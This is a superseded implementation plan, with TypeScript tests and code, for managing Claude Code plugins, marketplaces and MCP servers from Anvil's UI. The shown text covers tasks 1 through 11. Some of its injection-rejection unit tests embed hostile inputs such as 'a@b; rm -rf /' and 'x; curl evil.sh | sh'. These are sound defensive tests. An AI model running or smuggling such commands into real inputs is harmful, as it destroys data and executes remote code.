# Plugin & MCP Management — Implementation Plan

> **SUPERSEDED (2026-08-15)** by [`2026-08-15-claude-code-config-management-design.md`](2026-08-15-claude-code-config-management-design.md)
> and [`2026-08-15-cc-config-management-plan.md`](2026-08-15-cc-config-management-plan.md). None of these 22 tasks were executed.
>
> **Do not execute this file directly — but do not ignore it either.** The successor plan CARRIES FORWARD
> most of these tasks verbatim and cites them by number, because their code is still correct. Execute them
> only under the successor's numbering, applying its global rename table (`plugins` capability →
> `cc-config`, `PluginService` → `CcConfigService`, `web/src/plugins.ts` → `web/src/ccconfig.ts`).
> Tasks 1-7 and 10-22 here are the source text for the successor's carried tasks.

**Goal:** Manage Claude Code plugins and MCP servers from Anvil's UI, per machine, with a diff-based sync between boxes — no terminal anywhere.
**Architecture:** A thin adapter shells out to Claude Code's non-interactive CLI (`claude plugin … --json`, `claude mcp …`) and parses it; a P7-style domain service owns the domain; REST lands in the existing `/api/cc/v1` route table behind a new `plugins` capability; the web client gets a Settings → Plugins tab with per-server sections and a per-item sync diff.
**Tech Stack:** Bun/TypeScript, `bun:test`, vanilla-TS web client, jsdom for DOM tests.

**Design:** [`2026-08-14-plugin-mcp-management-design.md`](2026-08-14-plugin-mcp-management-design.md) (approved, commit `340f4b3`).

**GATES:** cc-cli-transport plan 9 (platform hardening/release) completes first; plan 9 is itself gated on PR #1 merging to the fork's `main`.

## Status

| Task | Description | Status | Tested | Pushed |
|------|-------------|--------|--------|--------|
| 1 | Capture real `claude plugin list --json` fixtures | pending | no | no |
| 2 | `src/cc/plugins.ts` types + `parsePluginList` (test first) | pending | no | no |
| 3 | Plugin read commands (`listPlugins`, `listAvailable`) | pending | no | no |
| 4 | Plugin write commands (install/uninstall/enable/disable/update) | pending | no | no |
| 5 | Marketplace commands (list/add/remove/update) | pending | no | no |
| 6 | Tolerant `claude mcp list` parser (test first) | pending | no | no |
| 7 | MCP commands (list/add/remove) | pending | no | no |
| 8 | `plugins` capability + contract test | pending | no | no |
| 9 | `PluginService` domain service + guard test | pending | no | no |
| 10 | Per-server serialisation guard (re-entrancy) | pending | no | no |
| 11 | REST read routes | pending | no | no |
| 12 | REST write routes + job progress | pending | no | no |
| 13 | Protocol: job progress event + capability doc | pending | no | no |
| 14 | Web: `plugins.ts` seam + Settings tab shell | pending | no | no |
| 15 | Web: per-server plugin list rendering | pending | no | no |
| 16 | Web: install/enable/disable/update/uninstall actions | pending | no | no |
| 17 | Web: MCP section (list + add + remove) | pending | no | no |
| 18 | Sync: diff computation + test | pending | no | no |
| 19 | Sync: REST endpoint | pending | no | no |
| 20 | Sync: web diff UI with per-item selection | pending | no | no |
| 21 | Docs: ARCHITECTURE + SECURITY notes | pending | no | no |
| 22 | Live pass on hub + one member | pending | no | no |

---

## Ground rules for the executing engineer

Read these once; they apply to every task.

- **All commands run from `anvild/`** unless stated otherwise.
- **Never mutate the developer's real `~/.claude`.** Every automated test that invokes the adapter must point `HOME` at a temp dir, or inject a fake `CommandRunner`. There is no exception.
- **Reuse, don't reinvent:** `CommandRunner` / `defaultRun` already exist in `src/cc/install.ts`; `resolveCcCommand(env)` already resolves the CC binary. Import them.
- After each task: `bun run typecheck` must pass. After web tasks also `bun run typecheck:web` and `bun run build:web`.
- Commit after each task with the message given.

---

## Task 1: Capture real `claude plugin list --json` fixtures

**Files:**
- Create: `anvild/test/fixtures/cc/plugin-list.json`
- Create: `anvild/test/fixtures/cc/plugin-list-empty.json`

**Step 1: Capture from the real CLI**

Run (from anywhere):

```bash
claude plugin list --json > anvild/test/fixtures/cc/plugin-list.json
echo '[]' > anvild/test/fixtures/cc/plugin-list-empty.json
```

**Step 2: Scrub anything machine-specific**

Open `plugin-list.json` and replace absolute paths under `installPath` with `/home/testuser/.claude/plugins/...`. Keep at least three entries, including one with a populated `mcpServers` object and one with `"version": "unknown"`.

**Step 3: Verify shape**

Run: `bun -e 'const a=require("./test/fixtures/cc/plugin-list.json"); console.log(a.length, Object.keys(a[0]).sort().join(","))'`
Expected: a count ≥ 3 and keys including `enabled,id,installPath,installedAt,mcpServers,scope,version`.

**Step 4: Commit**

`git commit -m "test(plugins): golden claude plugin list --json fixtures"`

---

## Task 2: `src/cc/plugins.ts` types + `parsePluginList`

**Files:**
- Create: `anvild/src/cc/plugins.ts`
- Create: `anvild/test/unit/cc-plugins.test.ts`

**Step 1: Write failing test**

`anvild/test/unit/cc-plugins.test.ts`:

```ts
/**
 * The CC plugin adapter. Reads go through `claude plugin list --json`, which is a supported,
 * documented contract — so the parser's job is to be strict about the fields we depend on and
 * tolerant about everything else (new fields must not break us).
 */
import { test, expect } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { parsePluginList } from "../../src/cc/plugins";

const fixture = (name: string): string => readFileSync(join(import.meta.dir, "../fixtures/cc", name), "utf8");

test("parses the real CLI's plugin list", () => {
  const out = parsePluginList(fixture("plugin-list.json"));
  expect(out.length).toBeGreaterThanOrEqual(3);
  const first = out[0]!;
  expect(typeof first.id).toBe("string");
  expect(typeof first.enabled).toBe("boolean");
  expect(first.name.length).toBeGreaterThan(0);
  expect(first.marketplace.length).toBeGreaterThan(0);
});

test("splits id into name@marketplace", () => {
  const out = parsePluginList(JSON.stringify([{ id: "episodic-memory@superpowers", version: "1.0.15", enabled: true, scope: "user" }]));
  expect(out[0]).toMatchObject({ name: "episodic-memory", marketplace: "superpowers", version: "1.0.15", enabled: true, scope: "user" });
});

test("an id with no marketplace still yields a usable name", () => {
  const out = parsePluginList(JSON.stringify([{ id: "local-thing", enabled: false }]));
  expect(out[0]).toMatchObject({ name: "local-thing", marketplace: "", enabled: false });
});

test("empty list parses to []", () => {
  expect(parsePluginList(fixture("plugin-list-empty.json"))).toEqual([]);
});

test("unknown extra fields are ignored, not fatal", () => {
  const out = parsePluginList(JSON.stringify([{ id: "a@b", enabled: true, somethingNew: { nested: 1 } }]));
  expect(out).toHaveLength(1);
});

test("garbage input throws a clear error rather than yielding junk", () => {
  expect(() => parsePluginList("not json")).toThrow(/plugin list/i);
  expect(() => parsePluginList('{"not":"an array"}')).toThrow(/plugin list/i);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: FAIL — `Cannot find module '../../src/cc/plugins'`.

**Step 3: Implement**

`anvild/src/cc/plugins.ts`:

```ts
/**
 * Adapter over Claude Code's non-interactive plugin/marketplace CLI.
 *
 * Anvil never edits `~/.claude` directly: marketplace resolution, dependency pruning, cache layout
 * and version pinning stay the CLI's job (design §3.3). This module is the only place that knows
 * the command lines, and it exposes a CLOSED set of operations — there is deliberately no
 * "run any claude subcommand" escape hatch for a client to reach.
 */
import { defaultRun, resolveCcCommand, type CommandRunner } from "./install";

/** One installed plugin, normalised from `claude plugin list --json`. */
export interface PluginInfo {
  /** The CLI's own identifier, `name@marketplace` — pass this back verbatim to write commands. */
  id: string;
  name: string;
  marketplace: string;
  version: string;
  enabled: boolean;
  scope: string;
  installPath?: string;
  /** Servers this plugin brings with it (already structured in the CLI's JSON). */
  mcpServers: string[];
}

export interface PluginCliOpts {
  /** Injected in tests; defaults to the real Bun spawn runner. */
  run?: CommandRunner;
  /** Env for the child (tests point HOME at a temp dir). Defaults to the daemon's own env. */
  env?: Record<string, string | undefined>;
  timeoutMs?: number;
}

const DEFAULT_TIMEOUT_MS = 120_000;

/** Split `name@marketplace`; a bare id keeps its name and reports an empty marketplace. */
function splitId(id: string): { name: string; marketplace: string } {
  const at = id.lastIndexOf("@");
  return at > 0 ? { name: id.slice(0, at), marketplace: id.slice(at + 1) } : { name: id, marketplace: "" };
}

/** Parse `claude plugin list --json`. Strict about the fields we use, tolerant of new ones. */
export function parsePluginList(raw: string): PluginInfo[] {
  let data: unknown;
  try {
    data = JSON.parse(raw);
  } catch {
    throw new Error(`could not parse plugin list output as JSON: ${raw.slice(0, 200)}`);
  }
  if (!Array.isArray(data)) throw new Error("plugin list output was not a JSON array");
  return data.map((row) => {
    const r = (row ?? {}) as Record<string, unknown>;
    const id = String(r.id ?? "");
    const { name, marketplace } = splitId(id);
    const servers = r.mcpServers && typeof r.mcpServers === "object" ? Object.keys(r.mcpServers as object) : [];
    return {
      id,
      name,
      marketplace,
      version: typeof r.version === "string" ? r.version : "unknown",
      enabled: r.enabled !== false,
      scope: typeof r.scope === "string" ? r.scope : "user",
      ...(typeof r.installPath === "string" ? { installPath: r.installPath } : {}),
      mcpServers: servers,
    };
  });
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: PASS (6 tests).

**Step 5: Commit**

`git commit -m "feat(plugins): CC plugin adapter types + list parser"`

---

## Task 3: Plugin read commands

**Files:**
- Modify: `anvild/src/cc/plugins.ts` (append)
- Modify: `anvild/test/unit/cc-plugins.test.ts` (append)

**Step 1: Write failing test** — append:

```ts
import { listPlugins, listAvailablePlugins } from "../../src/cc/plugins";
import type { CommandRunner } from "../../src/cc/install";

function recorder(out: string, code = 0) {
  const calls: string[][] = [];
  const run: CommandRunner = async (cmd) => (calls.push(cmd), { code, out });
  return { run, calls };
}

test("listPlugins shells out to `plugin list --json` and parses", async () => {
  const { run, calls } = recorder(fixture("plugin-list.json"));
  const out = await listPlugins({ run });
  expect(out.length).toBeGreaterThanOrEqual(3);
  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--json"]);
});

test("listAvailablePlugins asks for the marketplace catalogue", async () => {
  const { run, calls } = recorder("[]");
  await listAvailablePlugins({ run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "list", "--available", "--json"]);
});

test("a nonzero exit surfaces the CLI's own message", async () => {
  const { run } = recorder("marketplace unreachable", 1);
  await expect(listPlugins({ run })).rejects.toThrow(/marketplace unreachable/);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: FAIL — `listPlugins` is not exported.

**Step 3: Implement** — append to `src/cc/plugins.ts`:

```ts
/** Run one `claude …` subcommand, returning trimmed merged output. Throws on nonzero exit. */
async function cc(args: string[], opts: PluginCliOpts): Promise<string> {
  const env = opts.env ?? process.env;
  const cmd = [...resolveCcCommand(env), ...args];
  const runner = opts.run ?? defaultRun;
  const { code, out } = await runner(cmd, {
    timeoutMs: opts.timeoutMs ?? DEFAULT_TIMEOUT_MS,
    ...(opts.env ? { env: opts.env as Record<string, string> } : {}),
  });
  // The CLI's own stderr is the most useful thing we can show a user, so pass it through rather
  // than inventing a message (design §7).
  if (code !== 0) throw new Error(out || `claude ${args.join(" ")} exited ${code}`);
  return out;
}

export const listPlugins = async (opts: PluginCliOpts = {}): Promise<PluginInfo[]> =>
  parsePluginList(await cc(["plugin", "list", "--json"], opts));

export const listAvailablePlugins = async (opts: PluginCliOpts = {}): Promise<PluginInfo[]> =>
  parsePluginList(await cc(["plugin", "list", "--available", "--json"], opts));
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: PASS (9 tests).

**Step 5: Commit**

`git commit -m "feat(plugins): listPlugins/listAvailablePlugins over the CC CLI"`

---

## Task 4: Plugin write commands

**Files:**
- Modify: `anvild/src/cc/plugins.ts` (append)
- Modify: `anvild/test/unit/cc-plugins.test.ts` (append)

**Step 1: Write failing test** — append:

```ts
import { pluginOp, type PluginOp } from "../../src/cc/plugins";

test("install passes -y (required when stdin/stdout is not a TTY) and the scope", async () => {
  const { run, calls } = recorder("installed");
  await pluginOp("install", "superwisdom@seiraiyu", { run, scope: "user" });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "install", "superwisdom@seiraiyu", "--yes", "--scope", "user"]);
});

test("enable/disable/uninstall/update pass the id through unchanged", async () => {
  for (const op of ["enable", "disable", "uninstall", "update"] as PluginOp[]) {
    const { run, calls } = recorder("ok");
    await pluginOp(op, "a@b", { run });
    expect(calls[0]!.slice(1)).toEqual(["plugin", op, "a@b"]);
  }
});

test("an unknown op is refused before anything is spawned (closed operation set)", async () => {
  const { run, calls } = recorder("ok");
  await expect(pluginOp("rm -rf /" as PluginOp, "x", { run })).rejects.toThrow(/unsupported/i);
  expect(calls).toHaveLength(0);
});

test("a plugin id containing shell metacharacters is rejected, not escaped", async () => {
  const { run, calls } = recorder("ok");
  await expect(pluginOp("install", "a@b; rm -rf /", { run })).rejects.toThrow(/invalid plugin id/i);
  expect(calls).toHaveLength(0);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: FAIL — `pluginOp` is not exported.

**Step 3: Implement** — append to `src/cc/plugins.ts`:

```ts
/** The closed set of plugin mutations Anvil exposes. Anything else is refused. */
export type PluginOp = "install" | "uninstall" | "enable" | "disable" | "update";
const PLUGIN_OPS: readonly PluginOp[] = ["install", "uninstall", "enable", "disable", "update"];

/** Plugin ids are `name@marketplace` — letters, digits and a small punctuation set. We REJECT
 *  anything else rather than trying to escape it: there is no legitimate id with a shell
 *  metacharacter, and rejecting keeps this impossible to turn into command injection. */
const SAFE_ID = /^[A-Za-z0-9._@/-]{1,200}$/;

export interface PluginOpOpts extends PluginCliOpts {
  /** `user` (default), `project` or `local` — the CLI's own scopes. */
  scope?: string;
}

export async function pluginOp(op: PluginOp, id: string, opts: PluginOpOpts = {}): Promise<string> {
  if (!PLUGIN_OPS.includes(op)) throw new Error(`unsupported plugin operation: ${op}`);
  if (!SAFE_ID.test(id)) throw new Error(`invalid plugin id: ${id}`);
  const args = ["plugin", op, id];
  // `-y` is REQUIRED for a marketplace-declared install command when stdin/stdout is not a TTY,
  // which is always true for us. Only install prompts, so only install gets it.
  if (op === "install") {
    args.push("--yes");
    if (opts.scope) args.push("--scope", opts.scope);
  }
  return cc(args, opts);
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-plugins.test.ts`
Expected: PASS (13 tests).

**Step 5: Commit**

`git commit -m "feat(plugins): closed-set plugin mutations with id validation"`

---

## Task 5: Marketplace commands

**Files:**
- Modify: `anvild/src/cc/plugins.ts`, `anvild/test/unit/cc-plugins.test.ts`

**Step 1: Write failing test** — append:

```ts
import { listMarketplaces, marketplaceOp } from "../../src/cc/plugins";

test("marketplace list is requested as JSON", async () => {
  const { run, calls } = recorder("[]");
  await listMarketplaces({ run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "list", "--json"]);
});

test("marketplace add/remove/update pass the source through", async () => {
  const { run, calls } = recorder("ok");
  await marketplaceOp("add", "org/repo", { run });
  expect(calls[0]!.slice(1)).toEqual(["plugin", "marketplace", "add", "org/repo"]);
});

test("marketplace ops reject an unsafe source", async () => {
  const { run, calls } = recorder("ok");
  await expect(marketplaceOp("add", "x; curl evil.sh | sh", { run })).rejects.toThrow(/invalid marketplace/i);
  expect(calls).toHaveLength(0);
});
```

**Step 2: Run, verify failure.** Run: `bun test test/unit/cc-plugins.test.ts` → FAIL.

**Step 3: Implement** — append:

```ts
export type MarketplaceOp = "add" | "remove" | "update";
const MARKETPLACE_OPS: readonly MarketplaceOp[] = ["add", "remove", "update"];
/** A marketplace source is a URL, a path, or `owner/repo` — same reject-don't-escape rule as ids. */
const SAFE_SOURCE = /^[A-Za-z0-9._:@/~-]{1,400}$/;

/** Marketplaces are listed as raw JSON text; callers hand it straight to the client. */
export const listMarketplaces = async (opts: PluginCliOpts = {}): Promise<unknown> => {
  const raw = await cc(["plugin", "marketplace", "list", "--json"], opts);
  try {
    return JSON.parse(raw);
  } catch {
    return [];
  }
};

export async function marketplaceOp(op: MarketplaceOp, source: string, opts: PluginCliOpts = {}): Promise<string> {
  if (!MARKETPLACE_OPS.includes(op)) throw new Error(`unsupported marketplace operation: ${op}`);
  if (!SAFE_SOURCE.test(source)) throw new Error(`invalid marketplace source: ${source}`);
  return cc(["plugin", "marketplace", op, source], opts);
}
```

**Step 4: Run, verify pass.** Expected: PASS (16 tests).

**Step 5: Commit** — `git commit -m "feat(plugins): marketplace list/add/remove/update"`

---

## Task 6: Tolerant `claude mcp list` parser

`claude mcp list` has **no `--json`** (verified 2026-08-14), so this is the one place we parse human
output. The parser must degrade, never throw — a format change should show raw text, not break the page.

**Files:**
- Create: `anvild/src/cc/mcp.ts`
- Create: `anvild/test/unit/cc-mcp.test.ts`

**Step 1: Write failing test**

```ts
/**
 * `claude mcp list` is text-only (no --json), so this parser is a KNOWN maintenance point
 * (design §4.3). Its contract is therefore: extract what it can, and degrade to `raw` for any
 * line it does not understand — never throw, because a CLI format change must not break the page.
 */
import { test, expect } from "bun:test";
import { parseMcpList } from "../../src/cc/mcp";

const REAL = `Checking MCP server health…

claude.ai Google Drive: https://drivemcp.googleapis.com/mcp/v1 - ✔ Connected
claude.ai Gmail: https://gmailmcp.googleapis.com/mcp/v1 - ✘ Failed to connect
plugin:episodic-memory:episodic-memory: node /home/u/.claude/x.js - ✔ Connected`;

test("parses the real output into name/target/status", () => {
  const out = parseMcpList(REAL);
  expect(out).toHaveLength(3);
  expect(out[0]).toMatchObject({ name: "claude.ai Google Drive", target: "https://drivemcp.googleapis.com/mcp/v1", connected: true });
  expect(out[1]!.connected).toBe(false);
  expect(out[2]!.name).toBe("plugin:episodic-memory:episodic-memory");
});

test("the health-check header and blank lines are skipped", () => {
  expect(parseMcpList(REAL).some((s) => /Checking MCP/.test(s.name))).toBe(false);
});

test("an unrecognised line is preserved as raw rather than dropped or thrown", () => {
  const out = parseMcpList("something entirely new\n");
  expect(out).toHaveLength(1);
  expect(out[0]).toMatchObject({ name: "something entirely new", raw: true, connected: false });
});

test("empty output is an empty list", () => {
  expect(parseMcpList("")).toEqual([]);
  expect(parseMcpList("Checking MCP server health…\n")).toEqual([]);
});
```

**Step 2: Run, verify failure.** `bun test test/unit/cc-mcp.test.ts` → FAIL (module not found).

**Step 3: Implement** `anvild/src/cc/mcp.ts`:

```ts
/**
 * Adapter over `claude mcp …`.
 *
 * Writes (`add`/`remove`) are clean, supported, non-interactive. READS are the awkward half:
 * `claude mcp list` and `mcp get` have no `--json`, so §4.3 prefers structured sources —
 * `init.mcp_servers` from any turn, and the `mcpServers` field of `claude plugin list --json` —
 * and falls back to this tolerant parser only for user-added servers.
 */
import { defaultRun, resolveCcCommand, type CommandRunner } from "./install";

export interface McpServerInfo {
  name: string;
  target?: string;
  connected: boolean;
  /** True when the line could not be parsed — shown verbatim rather than dropped. */
  raw?: boolean;
}

export interface McpCliOpts {
  run?: CommandRunner;
  env?: Record<string, string | undefined>;
  timeoutMs?: number;
}

const SKIP = /^\s*$|^Checking MCP server health/i;

/** Lines look like `name: target - ✔ Connected`. Anything else is kept as a raw row. */
export function parseMcpList(out: string): McpServerInfo[] {
  const rows: McpServerInfo[] = [];
  for (const line of out.split("\n")) {
    if (SKIP.test(line)) continue;
    const text = line.trim();
    if (!text) continue;
    const m = /^(.+?):\s+(.*?)\s+-\s+(.*)$/.exec(text);
    if (!m) {
      rows.push({ name: text, connected: false, raw: true });
      continue;
    }
    rows.push({ name: m[1]!.trim(), target: m[2]!.trim(), connected: /connected/i.test(m[3]!) && !/fail|error/i.test(m[3]!) });
  }
  return rows;
}
```

**Step 4: Run, verify pass.** Expected: PASS (4 tests).

**Step 5: Commit** — `git commit -m "feat(mcp): tolerant claude mcp list parser"`

---

## Task 7: MCP commands

**Files:** modify `anvild/src/cc/mcp.ts`, `anvild/test/unit/cc-mcp.test.ts`

**Step 1: Write failing test** — append:

```ts
import { listMcpServers, addMcpServer, removeMcpServer } from "../../src/cc/mcp";
import type { CommandRunner } from "../../src/cc/install";

const rec = (out: string, code = 0) => {
  const calls: string[][] = [];
  const run: CommandRunner = async (cmd) => (calls.push(cmd), { code, out });
  return { run, calls };
};

test("listMcpServers shells out and parses", async () => {
  const { run, calls } = rec(REAL);
  expect(await listMcpServers({ run })).toHaveLength(3);
  expect(calls[0]!.slice(1)).toEqual(["mcp", "list"]);
});

test("addMcpServer uses add-json so the config is passed structurally, not as shell words", async () => {
  const { run, calls } = rec("added");
  await addMcpServer("sentry", { type: "http", url: "https://mcp.sentry.dev/mcp" }, { run });
  expect(calls[0]!.slice(1, 4)).toEqual(["mcp", "add-json", "sentry"]);
  expect(JSON.parse(calls[0]![4]!)).toMatchObject({ type: "http", url: "https://mcp.sentry.dev/mcp" });
});

test("server names are validated", async () => {
  const { run, calls } = rec("ok");
  await expect(removeMcpServer("a; rm -rf /", { run })).rejects.toThrow(/invalid mcp server name/i);
  expect(calls).toHaveLength(0);
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** — append to `src/cc/mcp.ts`:

```ts
const SAFE_NAME = /^[A-Za-z0-9 ._:@/-]{1,120}$/;
const DEFAULT_TIMEOUT_MS = 60_000;

async function cc(args: string[], opts: McpCliOpts): Promise<string> {
  const env = opts.env ?? process.env;
  const cmd = [...resolveCcCommand(env), ...args];
  const { code, out } = await (opts.run ?? defaultRun)(cmd, {
    timeoutMs: opts.timeoutMs ?? DEFAULT_TIMEOUT_MS,
    ...(opts.env ? { env: opts.env as Record<string, string> } : {}),
  });
  if (code !== 0) throw new Error(out || `claude ${args.join(" ")} exited ${code}`);
  return out;
}

export const listMcpServers = async (opts: McpCliOpts = {}): Promise<McpServerInfo[]> => parseMcpList(await cc(["mcp", "list"], opts));

/** `add-json` takes the whole server config as one JSON argument — no shell-word splitting of
 *  commands, args, headers or env, which is what makes this safe to drive from a UI. */
export async function addMcpServer(name: string, config: Record<string, unknown>, opts: McpCliOpts = {}): Promise<string> {
  if (!SAFE_NAME.test(name)) throw new Error(`invalid mcp server name: ${name}`);
  return cc(["mcp", "add-json", name, JSON.stringify(config)], opts);
}

export async function removeMcpServer(name: string, opts: McpCliOpts = {}): Promise<string> {
  if (!SAFE_NAME.test(name)) throw new Error(`invalid mcp server name: ${name}`);
  return cc(["mcp", "remove", name], opts);
}
```

**Step 4: Run, verify pass.** Expected: PASS (7 tests).

**Step 5: Commit** — `git commit -m "feat(mcp): list/add/remove over the CC CLI"`

---

## Task 8: `plugins` capability + contract test

**Files:**
- Modify: `anvild/src/server/identity.ts:101` (append to the capability array)
- Modify: `anvild/test/contract/protocol-surface.test.ts`

**Step 1: Add the capability** — in `src/server/identity.ts`, after the `"cc-update"` entry:

```ts
  // Plugin + MCP management (/api/cc/v1/plugins, /marketplaces, /mcp): per-machine install/enable
  // and cross-box sync (plugin-mcp-management design §5). Clients gate the whole Plugins tab on
  // this, so an older daemon renders no dead controls.
  "plugins",
```

**Step 2: Pin it** — add to `test/contract/protocol-surface.test.ts`:

```ts
test("the plugins capability is advertised", async () => {
  const { CAPABILITIES } = await import("../../src/server/identity");
  expect(CAPABILITIES).toContain("plugins");
});
```

(If `CAPABILITIES` is not the exported name, use the existing export in `identity.ts`.)

**Step 3: Run**

Run: `bun test test/contract/`
Expected: PASS. If the surface golden pins the capability list, regenerate with `bun test/contract/regen-golden.ts` and review the diff — it must show only an addition.

**Step 4: Commit** — `git commit -m "feat(plugins): advertise the plugins capability"`

---

## Task 9: `PluginService` domain service + guard test

**Files:**
- Create: `anvild/src/session/plugin-service.ts`
- Create: `anvild/test/unit/plugin-service.test.ts`

**Step 1: Write failing test**

```ts
/**
 * [P7] PluginService — the plugin/MCP domain. This isolates the INJECTION CONTRACT: every CLI call
 * goes through the injected adapter (so tests never touch a real ~/.claude), operations on one
 * server are serialised, and a failing op reports rather than throwing past the caller.
 */
import { test, expect } from "bun:test";
import { PluginService, type PluginServiceDeps } from "../../src/session/plugin-service";
import type { PluginInfo } from "../../src/cc/plugins";

function harness(overrides: Partial<PluginServiceDeps> = {}) {
  const calls: string[] = [];
  const plugins: PluginInfo[] = [
    { id: "a@m", name: "a", marketplace: "m", version: "1.0.0", enabled: true, scope: "user", mcpServers: [] },
  ];
  const deps: PluginServiceDeps = {
    listPlugins: async () => (calls.push("list"), plugins),
    listAvailable: async () => [],
    pluginOp: async (op, id) => (calls.push(`${op}:${id}`), "ok"),
    listMarketplaces: async () => [],
    marketplaceOp: async () => "ok",
    listMcp: async () => [],
    addMcp: async () => "ok",
    removeMcp: async () => "ok",
    ...overrides,
  };
  return { svc: new PluginService(deps), calls };
}

test("list delegates to the adapter", async () => {
  const { svc, calls } = harness();
  expect((await svc.list()).length).toBe(1);
  expect(calls).toEqual(["list"]);
});

test("a second operation is refused while one is in flight (re-entrancy guard)", async () => {
  let release!: () => void;
  const gate = new Promise<void>((r) => (release = r));
  const { svc } = harness({ pluginOp: async () => (await gate, "ok") });
  const first = svc.op("install", "a@m");
  await expect(svc.op("install", "b@m")).rejects.toThrow(/already in progress/i);
  release();
  await first;
});

test("the guard clears after a FAILED operation, so one error doesn't wedge the server", async () => {
  const { svc } = harness({ pluginOp: async () => { throw new Error("boom"); } });
  await expect(svc.op("install", "a@m")).rejects.toThrow(/boom/);
  await expect(svc.op("install", "a@m")).rejects.toThrow(/boom/); // not "already in progress"
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** `anvild/src/session/plugin-service.ts`:

```ts
/**
 * Plugin + MCP management domain (design §4.1), following the P7 injected-deps pattern: every
 * outside effect arrives through `PluginServiceDeps`, so the supervisor stays thin and tests never
 * shell out to a real `claude` or touch a real `~/.claude`.
 */
import type { PluginInfo, PluginOp, MarketplaceOp } from "../cc/plugins";
import type { McpServerInfo } from "../cc/mcp";
import { BadCommand } from "./errors";

export interface PluginServiceDeps {
  listPlugins: () => Promise<PluginInfo[]>;
  listAvailable: () => Promise<PluginInfo[]>;
  pluginOp: (op: PluginOp, id: string, scope?: string) => Promise<string>;
  listMarketplaces: () => Promise<unknown>;
  marketplaceOp: (op: MarketplaceOp, source: string) => Promise<string>;
  listMcp: () => Promise<McpServerInfo[]>;
  addMcp: (name: string, config: Record<string, unknown>) => Promise<string>;
  removeMcp: (name: string) => Promise<string>;
}

export class PluginService {
  constructor(private readonly deps: PluginServiceDeps) {}

  /** One mutation at a time per daemon: the CLI writes shared state under ~/.claude, and two
   *  concurrent installs would interleave. (The autopilot re-entrancy bug is the same shape.) */
  private busy = false;

  private async exclusive<T>(fn: () => Promise<T>): Promise<T> {
    if (this.busy) throw new BadCommand("a plugin operation is already in progress on this server");
    this.busy = true;
    try {
      return await fn();
    } finally {
      this.busy = false; // cleared on failure too, so one error can't wedge the server
    }
  }

  list(): Promise<PluginInfo[]> {
    return this.deps.listPlugins();
  }
  available(): Promise<PluginInfo[]> {
    return this.deps.listAvailable();
  }
  marketplaces(): Promise<unknown> {
    return this.deps.listMarketplaces();
  }
  mcp(): Promise<McpServerInfo[]> {
    return this.deps.listMcp();
  }

  op(op: PluginOp, id: string, scope?: string): Promise<string> {
    return this.exclusive(() => this.deps.pluginOp(op, id, scope));
  }
  marketplace(op: MarketplaceOp, source: string): Promise<string> {
    return this.exclusive(() => this.deps.marketplaceOp(op, source));
  }
  addMcp(name: string, config: Record<string, unknown>): Promise<string> {
    return this.exclusive(() => this.deps.addMcp(name, config));
  }
  removeMcp(name: string): Promise<string> {
    return this.exclusive(() => this.deps.removeMcp(name));
  }
}
```

**Step 4: Run, verify pass.** Expected: PASS (3 tests).

**Step 5: Commit** — `git commit -m "feat(plugins): PluginService domain with per-server serialisation"`

---

## Task 10: Wire the service into the server

**Files:** Modify `anvild/src/server/http.ts` (near the `ccUpdater` construction, ~line 258)

**Step 1: Construct it** — after the `ccUpdater` block:

```ts
  // Plugin + MCP management (design §4.1). Real adapter by default; tests inject `opts.pluginService`.
  const pluginService =
    opts.pluginService ??
    new PluginService({
      listPlugins: () => listPlugins(),
      listAvailable: () => listAvailablePlugins(),
      pluginOp: (op, id, scope) => pluginOp(op, id, scope ? { scope } : {}),
      listMarketplaces: () => listMarketplaces(),
      marketplaceOp: (op, source) => marketplaceOp(op, source),
      listMcp: () => listMcpServers(),
      addMcp: (name, config) => addMcpServer(name, config),
      removeMcp: (name) => removeMcpServer(name),
    });
```

Add to the imports at the top of `http.ts`:

```ts
import { PluginService } from "../session/plugin-service";
import { listPlugins, listAvailablePlugins, pluginOp, listMarketplaces, marketplaceOp } from "../cc/plugins";
import { listMcpServers, addMcpServer, removeMcpServer } from "../cc/mcp";
```

And add `pluginService?: PluginService;` to the server options interface (next to `ccUpdater?: CcUpdater;`, ~line 193).

**Step 2: Verify**

Run: `bun run typecheck`
Expected: clean.

**Step 3: Commit** — `git commit -m "feat(plugins): construct PluginService in the server"`

---

## Task 11: REST read routes

**Files:** Modify `anvild/src/server/http.ts` (after the `/api/cc/v1/rollback` route); create `anvild/test/integration/plugin-routes.test.ts`

**Step 1: Write failing test**

```ts
/**
 * The plugin REST surface. Reads are unauthenticated-but-tailnet-gated like the rest of /api/cc/v1;
 * writes require JSON content-type and reject a different tailnet user (parity with /apply).
 */
import { test, expect } from "bun:test";
import { bootServer } from "../helpers";
import { PluginService } from "../../src/session/plugin-service";

const fakeService = () =>
  new PluginService({
    listPlugins: async () => [{ id: "a@m", name: "a", marketplace: "m", version: "1", enabled: true, scope: "user", mcpServers: [] }],
    listAvailable: async () => [],
    pluginOp: async () => "installed",
    listMarketplaces: async () => [{ name: "m" }],
    marketplaceOp: async () => "ok",
    listMcp: async () => [{ name: "srv", connected: true }],
    addMcp: async () => "ok",
    removeMcp: async () => "ok",
  });

test("GET /api/cc/v1/plugins returns the installed list", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const res = await fetch(`${srv.base}/api/cc/v1/plugins`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { plugins: { id: string }[] };
    expect(body.plugins[0]!.id).toBe("a@m");
  } finally {
    srv.cleanup();
  }
});

test("GET /api/cc/v1/mcp returns servers with status", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const body = (await (await fetch(`${srv.base}/api/cc/v1/mcp`)).json()) as { servers: { name: string }[] };
    expect(body.servers[0]!.name).toBe("srv");
  } finally {
    srv.cleanup();
  }
});
```

